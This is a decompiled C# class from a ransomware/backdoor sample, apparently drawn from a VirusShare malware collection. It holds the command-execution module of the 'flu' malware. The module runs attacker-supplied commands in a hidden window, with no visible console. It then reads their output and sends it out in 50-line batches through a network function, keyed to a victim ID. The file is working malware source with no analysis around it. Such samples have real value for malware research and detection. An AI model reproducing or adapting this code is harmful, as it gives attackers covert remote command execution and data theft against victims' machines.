// Decompiled with JetBrains decompiler
// Type: flu.Console
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FFD10A3-F795-4E6C-98F1-531878AC8FB2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0823a4c2b70512027297c4a52d2117a230ec0d6b30ab0c45a5bbc5ba12ca8028.exe

using System;
using System.Diagnostics;

namespace flu
{
  internal class Console
  {
    private static Process cmd;

    public static void ExecuteAndSend(string command, string parameters, string uniqueID)
    {
      string str1 = OS.InfectionPath() + "\\_debug_err_win_32.txt";
      if (parameters == "cat _debug_err_win_32.txt")
        parameters = "cat " + str1;
      parameters = parameters.Replace("\\", "\\\\");
      Console.Execute(command, parameters);
      int num = 0;
      string info = "";
      string str2;
      while ((str2 = Console.cmd.StandardOutput.ReadLine()) != null)
      {
        if (++num % 50 == 0)
        {
          Network.SendInformation(info + str2 + "<br/>", command, uniqueID, 0);
          info = "";
        }
        else
          info = info + str2 + "<br/>";
      }
      Network.SendInformation(info, command, uniqueID, 1);
    }

    public static void Execute(string command, string parameters)
    {
      Console.cmd = new Process();
      Console.cmd.EnableRaisingEvents = true;
      Console.cmd.Exited += new EventHandler(Console.cmd_Exited);
      Console.cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      Console.cmd.StartInfo.CreateNoWindow = true;
      Console.cmd.StartInfo.RedirectStandardOutput = true;
      Console.cmd.StartInfo.RedirectStandardInput = false;
      Console.cmd.StartInfo.UseShellExecute = false;
      Console.cmd.StartInfo.FileName = command;
      Console.cmd.StartInfo.Arguments = parameters;
      Console.cmd.Start();
    }

    private static void cmd_Exited(object sender, EventArgs e)
    {
    }
  }
}
